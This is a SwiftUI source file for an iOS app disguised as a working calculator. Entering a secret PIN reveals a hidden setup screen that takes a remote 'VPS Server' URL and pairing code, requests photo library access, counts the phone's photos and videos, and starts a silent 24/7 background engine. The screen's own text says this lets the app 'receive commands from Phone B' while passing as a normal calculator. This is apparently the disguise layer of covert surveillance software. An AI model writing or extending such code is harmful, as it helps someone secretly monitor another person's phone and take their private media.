import SwiftUI

struct ContentView: View {
    @StateObject private var engine = VaultEngine.shared
    @State private var display = "0"
    @State private var currentOperation: String? = nil
    @State private var previousValue: Double = 0
    @State private var isTyping = false
    @State private var showSecretSheet = false

    // Secret passcode buffer to detect "9876="
    @State private var keyHistory = ""

    var body: some View {
        ZStack {
            Color.black.edgesIgnoringSafeArea(.all)

            VStack(spacing: 12) {
                Spacer()

                // Calculator Display
                HStack {
                    Spacer()
                    Text(display)
                        .font(.system(size: 72, weight: .light))
                        .foregroundColor(.white)
                        .lineLimit(1)
                        .minimumScaleFactor(0.3)
                        .padding(.horizontal, 24)
                }

                // Calculator Keypad
                VStack(spacing: 12) {
                    HStack(spacing: 12) {
                        calcButton("AC", color: .gray, textColor: .black) { clear() }
                        calcButton("+/-", color: .gray, textColor: .black) { toggleSign() }
                        calcButton("%", color: .gray, textColor: .black) { percentage() }
                        calcButton("÷", color: .orange) { setOperation("÷") }
                    }

                    HStack(spacing: 12) {
                        calcButton("7") { inputDigit("7") }
                        calcButton("8") { inputDigit("8") }
                        calcButton("9") { inputDigit("9") }
                        calcButton("×", color: .orange) { setOperation("×") }
                    }

                    HStack(spacing: 12) {
                        calcButton("4") { inputDigit("4") }
                        calcButton("5") { inputDigit("5") }
                        calcButton("6") { inputDigit("6") }
                        calcButton("-", color: .orange) { setOperation("-") }
                    }

                    HStack(spacing: 12) {
                        calcButton("1") { inputDigit("1") }
                        calcButton("2") { inputDigit("2") }
                        calcButton("3") { inputDigit("3") }
                        calcButton("+", color: .orange) { setOperation("+") }
                    }

                    HStack(spacing: 12) {
                        // Wide 0 button
                        Button(action: { inputDigit("0") }) {
                            HStack {
                                Text("0")
                                    .font(.system(size: 32, weight: .medium))
                                    .foregroundColor(.white)
                                    .padding(.leading, 32)
                                Spacer()
                            }
                            .frame(width: 172, height: 80)
                            .background(Color(white: 0.2))
                            .cornerRadius(40)
                        }

                        calcButton(".") { inputDigit(".") }
                        calcButton("=", color: .orange) { calculate() }
                    }
                }
                .padding(.bottom, 24)
            }
        }
        .sheet(isPresented: $showSecretSheet) {
            SecretSetupView(engine: engine, isPresented: $showSecretSheet)
        }
    }

    // MARK: - Calculator Logic & Secret Detection
    private func calcButton(_ label: String, color: Color = Color(white: 0.2), textColor: Color = .white, action: @escaping () -> Void) -> some View {
        Button(action: action) {
            Text(label)
                .font(.system(size: 32, weight: .medium))
                .foregroundColor(textColor)
                .frame(width: 80, height: 80)
                .background(color)
                .clipShape(Circle())
        }
    }

    private func inputDigit(_ digit: String) {
        keyHistory += digit
        if !isTyping {
            display = digit
            isTyping = true
        } else {
            display += digit
        }
    }

    private func clear() {
        display = "0"
        previousValue = 0
        currentOperation = nil
        isTyping = false
        keyHistory = ""
    }

    private func toggleSign() {
        if let val = Double(display) {
            display = String(-val)
        }
    }

    private func percentage() {
        if let val = Double(display) {
            display = String(val / 100)
        }
    }

    private func setOperation(_ op: String) {
        previousValue = Double(display) ?? 0
        currentOperation = op
        isTyping = false
        keyHistory += op
    }

    private func calculate() {
        keyHistory += "="

        // Check if Secret Passcode was entered (e.g. "9876=" or configured pin)
        if display == engine.secretPin || keyHistory.contains(engine.secretPin + "=") {
            // Trigger Secret Sheet!
            keyHistory = ""
            clear()
            showSecretSheet = true
            return
        }

        guard let op = currentOperation, let current = Double(display) else { return }
        var result: Double = 0
        switch op {
        case "+": result = previousValue + current
        case "-": result = previousValue - current
        case "×": result = previousValue * current
        case "÷": result = current != 0 ? previousValue / current : 0
        default: break
        }

        display = result.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(result)) : String(result)
        currentOperation = nil
        isTyping = false
    }
}

// MARK: - Secret Setup View (Visible only after entering PIN)
struct SecretSetupView: View {
    @ObservedObject var engine: VaultEngine
    @Binding var isPresented: Bool

    @State private var serverURL: String = ""
    @State private var pairingCode: String = ""
    @State private var secretPin: String = ""

    var body: some View {
        NavigationView {
            Form {
                Section(header: Text("Device Linking & Security")) {
                    HStack {
                        Text("Pairing Code")
                            .font(.subheadline)
                        Spacer()
                        TextField("Code", text: $pairingCode)
                            .multilineTextAlignment(.trailing)
                            .font(.system(.body, design: .monospaced))
                            .foregroundColor(.green)
                    }

                    HStack {
                        Text("Secret PIN")
                            .font(.subheadline)
                        Spacer()
                        TextField("PIN", text: $secretPin)
                            .multilineTextAlignment(.trailing)
                            .keyboardType(.numberPad)
                    }

                    HStack {
                        Text("VPS Server")
                            .font(.subheadline)
                        Spacer()
                        TextField("URL", text: $serverURL)
                            .multilineTextAlignment(.trailing)
                            .font(.caption)
                    }
                }

                Section(header: Text("Photo Permissions & Background Engine")) {
                    HStack {
                        Text("Photos Detected")
                        Spacer()
                        Text("\(engine.photosCount)")
                            .foregroundColor(.secondary)
                    }

                    HStack {
                        Text("Videos Detected")
                        Spacer()
                        Text("\(engine.videosCount)")
                            .foregroundColor(.secondary)
                    }

                    HStack {
                        Text("Background Engine")
                        Spacer()
                        Text(engine.isBackgroundActive ? "ACTIVE (24/7)" : "OFFLINE")
                            .foregroundColor(engine.isBackgroundActive ? .green : .red)
                            .fontWeight(.bold)
                    }

                    Button(action: activateVault) {
                        HStack {
                            Spacer()
                            Text(engine.isActivated ? "RE-ACTIVATE & SYNC" : "GRANT PERMISSION & ACTIVATE")
                                .fontWeight(.bold)
                                .foregroundColor(.white)
                            Spacer()
                        }
                        .padding(.vertical, 8)
                        .background(Color.green)
                        .cornerRadius(10)
                    }
                }

                Section(footer: Text("Once activated, close this screen. The app will look and act like a normal calculator, running silent background keep-alive to receive commands from Phone B.")) {
                    Button(action: {
                        saveAndDismiss()
                    }) {
                        HStack {
                            Spacer()
                            Text("SAVE & HIDE (RETURN TO CALCULATOR)")
                                .fontWeight(.semibold)
                                .foregroundColor(.blue)
                            Spacer()
                        }
                    }
                }
            }
            .navigationTitle("Secret Vault Setup")
            .navigationBarItems(trailing: Button("Done") { saveAndDismiss() })
            .onAppear {
                serverURL = engine.serverURL
                pairingCode = engine.pairingCode
                secretPin = engine.secretPin
            }
        }
    }

    private func activateVault() {
        engine.serverURL = serverURL
        engine.pairingCode = pairingCode.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        engine.secretPin = secretPin
        engine.saveSettings()

        engine.requestPhotoPermission { granted in
            if granted {
                engine.isActivated = true
                engine.startBackgroundKeepAlive()
                engine.startHeartbeat()
                engine.saveSettings()
            }
        }
    }

    private func saveAndDismiss() {
        engine.serverURL = serverURL
        engine.pairingCode = pairingCode.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        engine.secretPin = secretPin
        engine.saveSettings()
        isPresented = false
    }
}
